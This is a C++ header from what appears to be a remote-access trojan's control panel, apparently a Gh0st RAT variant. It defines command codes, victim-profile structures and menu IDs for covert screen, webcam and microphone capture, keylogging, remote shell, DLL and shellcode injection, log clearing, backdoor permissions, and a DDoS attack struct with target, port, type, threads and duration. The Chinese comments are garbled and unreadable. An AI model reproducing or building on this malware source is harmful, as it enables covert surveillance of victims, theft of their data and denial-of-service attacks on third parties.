#pragma once
#include "Buffer.h"
// BYTE���Ҳ��256
enum MAIN
{
	TOKEN_CONDITION,			//���ݸ���
	TOKEN_ERROR,				//�ͻ��˷�����Ϣ
	TOKEN_PROCESS,				//����
	TOKEN_GNDESKTOP,			//�����ͼԤ��
	TOKEN_GETVERSION,			//��ȡ�汾
	TOKEN_SENDLL,				//����DLL����
	TOKEN_LOGIN,				//����

	TOKEN_DRIVE_LIST,			//�ļ�����
	TOKEN_WEBCAM_BITMAPINFO,	//����ͷ
	TOKEN_AUDIO_START,			//��˷�
	TOKEN_SPEAK_START,			//������
	TOKEN_KEYBOARD_START,		//���̼�¼
	TOKEN_PSLIST,				//ϵͳ����
	TOKEN_SHELL_START,			//Զ���ն�
	TOKEN_SYSINFOLIST,			//��������
	TOKEN_CHAT_START,			//Զ�̽�̸
	TOKEN_REGEDIT,				//ע������ 
	TOKEN_PROXY_START,			//����
	TOKEN_DDOS,					//ѹ������
	TOKEN_INJECT,				//ע�����

	TOKEN_MONITOR,				//��Ļ���
	TOKEN_BITMAPINFO_DIF,		//������Ļ
	TOKEN_BITMAPINFO_QUICK,		//������Ļ
	TOKEN_BITMAPINFO_PLAY,		//������Ļ
	TOKEN_BITMAPINFO_HIDE,		//��̨��Ļ


	TOKEN_KERNEL = 100,			//��������


	TOKEN_EXPAND = 200,				//������չ���
	TOKEN_HEARTBEAT,				//����
	TOKEN_ACTIVED,					//����
	TOKEN_GETAUTODLL,				//�Զ�����
	TOKEN_NOTHING = 255,			//0
};


enum  KernelManager
{
	COMMAND_DLLMAIN,
	COMMAND_SENDLL,
	COMMAND_CLOSESOCKET,
	COMMAND_GET_PROCESSANDCONDITION,
	COMMAND_GET_SCREEN,
	COMMAND_UPLOAD_EXE,
	COMMAND_DOWN_EXE,
	COMMAND_RENAME,
	COMMAND_FILTERPROCESS,
	COMMAND_MONITOR,
	COMMAND_GETMONITOR,
	COMMAND_CLEANLOG,
	COMMAND_RESTART,
	COMMAND_EXIT,
	COMMAND_LOGOUT,
	COMMAND_REBOOT,
	COMMAND_SHUTDOWN,
	COMMAND_CHANGELOAD,
	COMMAND_CHANGEINFO,
	COMMAND_ADDCLIENT,
	COMMAND_SET_DOOR_GETPERMINSSION = 100,
	COMMAND_SET_DOOR_QUITPERMINSSION,

};





enum e_socket
{
	tcp,
	udp,
};


#define	NC_CLIENT_CONNECT		0x0001
#define	NC_CLIENT_DISCONNECT	0x0002
#define	NC_TRANSMIT				0x0003
#define	NC_RECEIVE				0x0004
#define NC_RECEIVE_COMPLETE		0x0005 // ��������
#define NC_SEND_SHELCODE_32		0x0006 // ����shellcode
#define NC_SEND_SHELCODE_64		0x0007 // ����shellcode


#define	MAX_WRITE_RETRY		15		// ����д���ļ�����
#define MAX_SEND_BUFFER		65535	// ��������ݳ��� 1024*64
#define	MAX_RECV_BUFFER		65535 // ���������ݳ���

class CLock
{
public:
	CLock(CRITICAL_SECTION& cs)
	{
		m_pcs = &cs;
		EnterCriticalSection(m_pcs);
	}
	~CLock()
	{
		LeaveCriticalSection(m_pcs);
	}
protected:
	CRITICAL_SECTION* m_pcs;
};


//������
typedef struct _cl_cs {
	LONG bLock;
	DWORD ownerThreadId;
	LONG lockCounts;
	_cl_cs::_cl_cs()
	{
		bLock = FALSE;
		ownerThreadId = 0;
		lockCounts = 0;
	}
	_cl_cs::~_cl_cs()
	{

	}

	void enter() {
		auto cid = GetCurrentThreadId();
		if (ownerThreadId != cid) {
			while (InterlockedExchange(&bLock, TRUE) == TRUE);
			//Sleep(0);
			ownerThreadId = cid;
		}
		++lockCounts;
	}
	void leave() {
		auto cid = GetCurrentThreadId();
		if (cid != ownerThreadId)
			return;
		--lockCounts;
		if (lockCounts == 0) {
			ownerThreadId = 0;
			bLock = FALSE;
		}
	}
	inline void lock() { enter(); }
	inline void unlock() { leave(); }
}CLCS, * PCLCS;

template<class CLockObj> class CLocalLock
{
public:
	CLocalLock(CLockObj& obj) : m_lock(obj) { m_lock.lock(); }
	~CLocalLock() { m_lock.unlock(); }
private:
	CLockObj& m_lock;
};

typedef CLocalLock<_cl_cs>					CCriSecLock;

enum IOType
{
	IOInitialize,
	IORead,
	IOWrite,
	IOIdle
};


class OVERLAPPEDPLUS
{
public:
	OVERLAPPED			m_ol;
	IOType				m_ioType;

	OVERLAPPEDPLUS(IOType ioType) {
		ZeroMemory(this, sizeof(OVERLAPPEDPLUS));
		m_ioType = ioType;
	}
};

typedef struct
{
	BYTE			Btoken;			//Э��
	TCHAR			N_ip[255];		//����IP
	TCHAR			ip[20];			//����IP
	TCHAR			addr[40];		//λ��
	TCHAR			UserActive[15];	//��Ծ״̬
	TCHAR			CptName[50];	//�������
	TCHAR			OsName[50];		//ϵͳ��
	TCHAR			OSVersion[30];	//ϵͳ
	TCHAR			CPU[60];		//CPU
	TCHAR			DAM[200];		//Ӳ��+�ڴ�
	TCHAR			GPU[150];		//�Կ�
	TCHAR			Window[255];	//��ǰ����
	TCHAR			Group[50];		//����
	TCHAR			Version[50];	//�汾
	TCHAR			Remark[50];		//��ע
	TCHAR			m_Time[50];		//����ʱ��
	TCHAR			ExeAndOs[10];	//�����ϵͳ�Ƿ�Ϊ64λ
	TCHAR			Process[50];	//����Ȩ���û�
	TCHAR			ProcPath[250];	//����·��
	TCHAR			pid[10];		//����ID
	TCHAR			IsWebCam[4];	//����ͷ
	TCHAR			Chat[255];		//����
	TCHAR			Virus[50];		//ɱ��
	TCHAR			lpLCData[32];	//ϵͳ����
	TCHAR			Monitors[255];	//��ʾ����Ϣ
	TCHAR			szSysdire[50];	//ϵͳĿ¼
	TCHAR			szHWID[49];		//HWID
	BOOL			backdoor;		//���ű�־
}LOGININFO;

struct ClientContext
{
	ULONG_PTR			m_Socket;
	// Store buffers
	CBuffer				m_WriteBuffer;
	CBuffer				m_CompressionBuffer;	// ���յ���ѹ��������
	CBuffer				m_DeCompressionBuffer;	// ��ѹ�������

	//WSABUF				m_wsaInBuffer;
	//BYTE				m_byInBuffer[MAX_RECV_BUFFER];
	//WSABUF				m_wsaOutBuffer;

	int					m_Dialog[2]; // �ŶԻ����б��ã���һ��int�����ͣ��ڶ�����CDialog�ĵ�ַ
	int					m_allpack_rev;
	long long			m_alldata_rev;
	int					m_allpack_send;
	long long			m_alldata_send;

	int				IsConnect;
	CLCS				m_clcs_send_rec_close;

	DWORD				dwID;
	BYTE				m_bProxyConnected;
	BOOL				m_bIsMainSocket; // �ǲ�����socket
	BOOL				m_bIsSys; 
	e_socket				switchsocket;
	TCHAR szAddress[20];    //Զ�̵�ַ
	USHORT usPort;			//Զ�̶˿�
	PVOID m_server;
	byte m_password[10];	//ͨ������

	TCHAR m_ip[255];		//�����ַ
	USHORT m_port;			//����˿�
	BOOL	bisx86;			//�ͻ�λ��
	LOGININFO* LoginInfo;  //��Ϣ����


	byte* ScreenPicture;	//����ͼ
	int PictureSize;
	int	iScreenWidth;
	int	iScreenHeight;

	//���´���
	void* pView;
	CXTPReportRecord* pRecord_old;
	CXTPReportRecordItem* Item_cmp_old_Context;   //��0�� ������������
	CXTPReportRecordItem* Item_cmp_old_IsActive;  //��Ծ״̬
	CXTPReportRecordItem* Item_cmp_old_winodow;	  //���ڸ���
	CXTPReportRecordItem* Item_cmp_old_m_Time;	  //��&����

};
typedef struct MESSAGE
{
	DWORD       msg_id;
	char		addr[255];
	int			port;
	int			time;
	int			thread;
	int			pt;
	int			updatedns;
	char		zdy[256];
	char		url[256];
	int			s;
	int			s2;
	int			onedata;
	bool		recvdata;
	char		yfcs[256];
	char		cookiescs[256];
}IMESSAGE;

typedef struct DDOS_HEAD
{
	TCHAR Target[400];    //����Ŀ��
	WORD AttackPort;     //�����˿�
	WORD AttackType;     //��������
	WORD AttackThread;   //�����߳�
	WORD AttackTime;     //����ʱ��
	CHAR SendData[2000]; //���͵����ݰ�
	WORD DataSize;       //���ݰ���С
	DWORD ExtendData1;   //��������
	DWORD ExtendData2;   //��������
}ATTACK, * LPATTACK;





enum
{

	WM_ADDTOMAINLIST = WM_USER + 102,	// ��ӵ��б���ͼ��
	WM_DESKTOPPOPUP,					//��ʾ����

	WM_ADDFINDGROUP,				// ����ʱ���ҷ���
	WM_DELFINDGROUP,				// ����ʱ���ҷ���
	WM_REMOVEFROMLIST,				// ���б���ͼ��ɾ��

	WM_OPENSCREENSPYDIALOG_DIF,		//������Ļ
	WM_OPENSCREENSPYDIALOG_QUICK,	//������Ļ
	WM_OPENSCREENSPYDIALOG_PLAY,	//������Ļ
	WM_OPENSCREENSPYDIALOG_HIDE,	//��̨��Ļ

	WM_OPENMANAGERDIALOG,			// �ļ�����
	WM_OPENWEBCAMDIALOG,			// ������ͷ���Ӵ���
	WM_OPENAUDIODIALOG,				// ��������������
	WM_OPENSPEAKERDIALOG,			//����������������
	WM_OPENKEYBOARDDIALOG,			// �򿪼��̼�¼����
	WM_OPENSYSTEMDIALOG,			// �򿪽��̹�����
	WM_OPENSHELLDIALOG,				// ��shell����
	WM_OPENSYSINFODIALOG,			// �򿪷�������Ϣ����
	WM_OPENREGEDITDIALOG,           // ��ע��������
	WM_OPENDLLDLG,                  // �򿪹��ܿؼ����ش���
	WM_OPENCHATDIALOG,		    	// �򿪽�̸����
	WM_OPENQQINFODIALOG,			// ��QQ������Ϣ����
	WM_OPENPROXYDIALOG,				//�򿪴�����
	WM_OPENPYSINFOLISTDIALOG,		//ϵͳ����
	WM_OPENPEXPANDDIALOG,			// �������

	WM_OPENPKERNELDIALOG,			// �������

	WM_DDOS_CLIENT,					//DDOS������Ϣ
	WM_MONITOR_CLIENT,				//��ش�����Ϣ
	WM_MONITOR_CHANGECLIENT,		//�ظ���¼�滻�¼�ش�����Ϣ

	//////////////////////////////////////////////////////////////////////////
	FILEMANAGER_DLG = 1,	//�ļ�����
	SCREENSPY_DIF_DLG,		//������Ļ
	SCREENSPY_QUICK_DLG,	//������Ļ
	SCREENSPY_PLAY_DLG,		//������Ļ
	SCREENSPY_HIDE_DLG,		//��̨��Ļ
	WEBCAM_DLG,				//����ͷ
	AUDIO_DLG,				//��˷�
	SPEAKER_DLG,			//������ 
	CHAT_DLG,				//�Ի�
	SHELL_DLG,				//�ն�
	PROXY_DLG,				//����
	KEYBOARD_DLG,			//����	
	REGEDIT_DLG,			//ע���
	MACHINE_DLG,			//ϵͳ����
	EXPAND_DLG,				//�������
	KERNEL_DLG,				//�������
	MONITOR_DLG,			//��Ļ����뿪
	DDDOS_DLG_IN,			//DDOS����
	DDDOS_DLG_OUT,			//DDOS�뿪
};



typedef struct
{
	BYTE			Btoken;			//Э��
	TCHAR			UserActive[15];	//״̬
	TCHAR			Window[250];	//��ǰ����
	int				iScreenWidth;
	int				iScreenHeight;
	bool			bsomes[20];
}DATAUPDATE;


typedef struct
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	BOOL    error;
}FILESIZE;



enum SENDTASK
{
	TASK_MAIN,					//��ͨ�����ʽ ��1����ͨ���������� ��������
	TASK_PLUG,					//��չ������ر�־
};


struct DllSendDate
{
	SENDTASK sendtask;
	TCHAR DllName[255];			 //DL����
	BOOL is_64;					//λ��
	int DateSize;				//DLL��С
	TCHAR szVersion[50];		//�汾
	TCHAR szcommand[1000];
	int i;
};





struct SendErrorDate
{
	BYTE Btoken;
	TCHAR ErrorDate[255];

};
struct serverstartdate
{
	CString ip, m_net, port;
};



struct  portinfo
{
	TCHAR ip[255];
	TCHAR m_net[30];
	TCHAR port[30];
	TCHAR isok[30];
};



struct MYtagMSG { //�Զ��������Ϣ


	UINT        lParam;
	UINT        message;
	long long      wParam;
	int x;
	int y;
};


struct  WINDOWSINFO
{
	TCHAR strTitle[1024];
	DWORD m_poceessid;
	DWORD m_hwnd;
	bool canlook;
	int w;
	int h;
};

struct  EXPANDLAYOUT
{
	byte token;
	TCHAR strTitle[30];     //����
	int win_w, win_h;		//���ڴ�С

	int edit_in_x, edit_in_y, edit_in_w, edit_in_h;	//����
	bool bedit_in_show;// �Ƿ���ʾ

	int edit_out_x, edit_out_y, edit_out_w, edit_out_h;//���
	bool bedit_out_show;// �Ƿ���ʾ

	TCHAR str_button_get_Title[30];						//��ȡ��ť
	int button_get_x, button_get_y, button_get_w, button_get_h;
	bool bbutton_get_show;// �Ƿ���ʾ

	TCHAR str_button_set_Title[30];						//���ð�ť
	int button_set_x, button_set_y, button_set_w, button_set_h;
	bool bbutton_set_show;// �Ƿ���ʾ

	int list_x, list_y, list_w, list_h;//�б��
	bool blist_show;// �Ƿ���ʾ

	int Columns;// ���ű���Ŷ
	int menus;// ���ű���Ŷ

};

struct SColumns
{
	TCHAR title[30];
	int w;
};

struct COPYCLIENT
{
	byte token;
	TCHAR confimodel[1000];
};


#define net_msg
class __declspec(novtable) CIOMessageMap
{
public:
	virtual bool ProcessIOMessage(IOType clientIO, ClientContext* pContext, DWORD dwSize) = 0;
};

#define BEGIN_IO_MSG_MAP() \
public: \
		bool ProcessIOMessage(IOType clientIO, ClientContext* pContext, DWORD dwSize = 0) \
		{ \
			bool bRet = false; 

#define IO_MESSAGE_HANDLER(msg, func) \
			if (msg == clientIO) \
				bRet = func(pContext, dwSize); 

#define END_IO_MSG_MAP() \
		return bRet; \
	}




#define MENU_����Ԥ��							100
#define MENU_����ȫ��							150
#define MENU_����IP								152
#define MENU_��������							154
#define MENU_��������							156
#define MENU_�����Կ�							158
#define MENU_���Ʊ��							160

#define MENU_��ȡ״̬							201
#define MENU_������							203
#define MENU_�˳����							204
#define MENU_�ļ�����							1000
#define MENU_������Ļ							1010
#define MENU_������Ļ							1020
#define MENU_������Ļ							1025
#define MENU_��̨��Ļ							1030
#define MENU_���ż���							1040
#define MENU_��������							1050
#define MENU_��Ƶ�鿴							1060
#define MENU_ϵͳ����							1080
#define MENU_Զ���ն�							1110
#define MENU_���̼�¼							1120
#define MENU_��ע���							1130
#define MENU_����ӳ��							1140
#define MENU_Զ�̽�̸							1150
#define MENU_��������							1897
#define MENU_�ϴ�����							1898
#define MENU_������־							1899
#define MENU_��������							1901
#define MENU_�Ͽ�����							1902
#define MENU_ж��								1903
#define MENU_�ƻ�								1905
#define MENU_����								1906
#define MENU_��ȡ����Ȩ							1910
#define MENU_�ָ�����Ȩ							1911
#define MENU_ע��								2001
#define MENU_����								2002
#define MENU_�ػ�								2003

#define MENU_�������							2560
#define MENU_ѹ������							2650

#define MENU_�޸ķ���							3020
#define MENU_�޸ı�ע							3021

#define MENU_ȡ��˧ѡ							3100
#define MENU_˧ѡ����							3101

#define MENU_�ر��ע							3120
#define MENU_���з�ʽ							3130




#define MENU_KERNEL_ע��						5001
#define MENU_KERNEL_��ע						5011
